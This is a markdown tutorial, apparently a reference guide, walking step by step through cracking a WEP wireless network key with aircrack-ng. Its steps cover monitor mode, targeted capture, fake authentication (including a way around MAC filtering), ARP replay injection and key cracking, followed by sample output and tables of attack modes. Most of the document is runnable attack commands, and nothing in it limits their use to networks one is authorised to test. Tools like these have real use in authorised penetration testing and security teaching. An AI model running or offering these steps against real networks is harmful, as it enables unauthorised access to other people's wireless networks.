# Aircrack-ng WEP Workflow

Practical step-by-step WEP key recovery using the aircrack-ng suite. The PTW
attack (aircrack-ng default) requires ~40,000 unique IVs from ARP frames.

## Prerequisites

- Wireless adapter supporting monitor mode and packet injection
- aircrack-ng suite: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`
- Target network using WEP encryption
- Target BSSID and channel number (from initial scan)

## Step 1: Enable Monitor Mode

```bash
# Kill interfering processes
airmon-ng check kill

# Create monitor interface
airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon
```

`airmon-ng check kill` stops NetworkManager, wpa_supplicant, and other
processes that interfere with packet injection. The monitor interface is
typically named `wlan0mon`.

## Step 2: Find Target Network

```bash
# Scan all channels
airodump-ng wlan0mon
```

Identify the target network's BSSID (AP MAC address), channel number, and
confirm it shows `WEP` in the ENC column. Note the BSSID for subsequent steps.

## Step 3: Start Targeted Capture

```bash
# Capture on specific channel and BSSID, write to file
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

Keep this terminal open. The `#Data` column shows unique IV count. Leave
running throughout the attack.

## Step 4: Fake Authentication (if needed)

To inject packets, the adapter must be associated with the AP:

```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <your_mac> wlan0mon
```

A successful fake auth shows "Association successful." If the AP uses MAC
filtering, this step requires a client MAC from `airodump-ng` output.

## Step 5: ARP Replay Injection

This is the IV-generation step. Captures a real ARP request and replays it to
generate many new IVs quickly:

```bash
aireplay-ng -3 -b <BSSID> -h <your_mac> wlan0mon
```

Wait for the tool to capture an ARP packet (may take a few seconds if a
client is active). Once captured, it replays at high speed (~500 ARP/sec).
The `#Data` counter in the airodump-ng window should increment rapidly.

If no client is present to capture an ARP from, wait for a client association
or use the interactive packet replay attack (`-2`) to forge an ARP.

## Step 6: Crack the Key

Once `#Data` reaches ~40,000 (for WEP-104 with PTW attack, 40K is often
sufficient; use 80K+ for more reliable results):

```bash
aircrack-ng capture*.cap
```

PTW is the default. If PTW fails (unusual), try KoreK:

```bash
aircrack-ng -K capture*.cap    # KoreK statistical attack
```

## Expected Output

Successful key recovery:

```
Aircrack-ng 1.7

[00:00:12] Tested 4 keys (got 85472 IVs)

   KB    depth   byte(vote)
    0    0/  1   AB( 516) 7F( 454) ...
    1    0/  1   CD( 512) A3( 448) ...
    ...

KEY FOUND! [ AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23 ]
     Decrypted correctly: 100%
```

The key is shown in hex. For ASCII WEP keys, decode the hex bytes to ASCII.

## Minimum IV Counts

| Attack | WEP-40 | WEP-104 | Notes |
|--------|--------|---------|-------|
| PTW | ~15,000 | ~40,000 | Default; needs ARP frames |
| KoreK | ~150,000 | ~500,000 | Works with any data frames |
| FMS | ~500,000 | ~4,000,000 | Legacy; rarely needed |

## Key aireplay-ng Attack Modes

| Mode | Flag | Purpose |
|------|------|---------|
| Fake Authentication | `-1` | Associate adapter with AP |
| Interactive Replay | `-2` | Manually select and replay a frame |
| ARP Replay | `-3` | Automated ARP request replay (primary IV generator) |
| KoreK ChopChop | `-4` | Decrypt frame byte-by-byte |
| Fragmentation | `-5` | Recover keystream via fragmentation |
| Deauth | `-0` | Force clients to reconnect (generates traffic) |
| Caffe-Latte | `-6` | Client-side attack without AP |
| Hirte | `-8` | ARP fragmentation client attack |

## Notes

- The capture file (`capture*.cap`) accumulates all frames. aircrack-ng reads
  it while airodump-ng is still writing — no need to stop capture first.
- The `#Data` counter in airodump-ng tracks IV count, not raw frame count.
- Do not run `wpaclean` on WEP captures — it removes needed frames.
